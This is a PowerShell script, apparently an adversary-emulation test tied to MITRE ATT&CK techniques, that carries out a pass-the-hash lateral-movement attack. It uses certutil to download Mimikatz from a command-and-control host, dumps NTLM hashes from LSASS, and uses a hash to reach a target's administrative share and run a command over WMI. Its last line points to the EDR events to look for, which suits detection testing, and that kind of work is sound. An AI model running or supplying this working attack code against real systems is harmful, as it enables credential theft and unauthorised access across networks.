param(
    [Parameter(Mandatory=$true)]
    [string]$TargetIP,
    
    [Parameter(Mandatory=$true)]
    [string]$C2Host
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting Lateral Movement - Pass-the-Hash Attack..." -ForegroundColor Cyan

# T1550.002 - Use Alternate Authentication Material: Pass the Hash
# Uses harvested NTLM hashes to authenticate without knowing plaintext passwords

Write-Host "[*] [T1550.002] Pass-the-Hash via Mimikatz" -ForegroundColor Yellow
Write-Host "[!] Target: $TargetIP" -ForegroundColor Yellow
Write-Host "[!] Requires: Previously harvested NTLM hash + Mimikatz" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
$mimikatzPath = "$stagingDir\mimikatz.exe"

# Step 1: Ensure Mimikatz is available
if (-not (Test-Path $mimikatzPath)) {
    Write-Host "`n[*] [T1105] Downloading Mimikatz..."
    certutil -urlcache -split -f "http://$C2Host/tools/mimikatz.exe" $mimikatzPath
}

# Step 2: First dump credentials to get hashes
if (Test-Path $mimikatzPath) {
    Write-Host "`n[*] [T1003.001] Step 1: Extracting NTLM hashes from LSASS..."
    Write-Host "    CMD: mimikatz `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`""
    $credOutput = & $mimikatzPath "privilege::debug" "sekurlsa::logonpasswords" "exit" 2>&1
    
    # Display extracted hashes
    $credOutput | Select-String -Pattern "NTLM\s+:" | ForEach-Object {
        Write-Host "    [+] Hash found: $($_.Line.Trim())" -ForegroundColor Green
    }
    
    # Step 3: Pass-the-Hash
    Write-Host "`n[*] [T1550.002] Step 2: Performing Pass-the-Hash..."
    Write-Host "    This spawns a new process authenticated with the NTLM hash"
    Write-Host "    CMD: mimikatz `"sekurlsa::pth /user:Administrator /domain:. /ntlm:<HASH> /run:cmd.exe`""
    
    # Execute PTH - this attempts to spawn cmd.exe with the stolen hash
    Write-Host "`n[*] Attempting PTH to $TargetIP..."
    & $mimikatzPath "privilege::debug" "sekurlsa::pth /user:Administrator /domain:. /ntlm:aad3b435b51404eeaad3b435b51404ee /run:""cmd.exe /c net use \\$TargetIP\C$ && dir \\$TargetIP\C$\Users""" "exit" 2>&1
    
    # Alternative: WMI lateral movement with PTH token
    Write-Host "`n[*] [T1047] Step 3: Using PTH token for WMI lateral movement..."
    Write-Host "    CMD: Invoke-WmiMethod -ComputerName $TargetIP -Class Win32_Process -Name Create -ArgumentList 'whoami'"
    Invoke-WmiMethod -ComputerName $TargetIP -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\pth_output.txt" -ErrorAction SilentlyContinue

} else {
    Write-Host "[-] Mimikatz not available for PTH" -ForegroundColor Red
}

Write-Host "`n[+] Pass-the-Hash Attack Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: PTH logon events (4624 Type 9), NTLM auth, Mimikatz sekurlsa::pth" -ForegroundColor Yellow
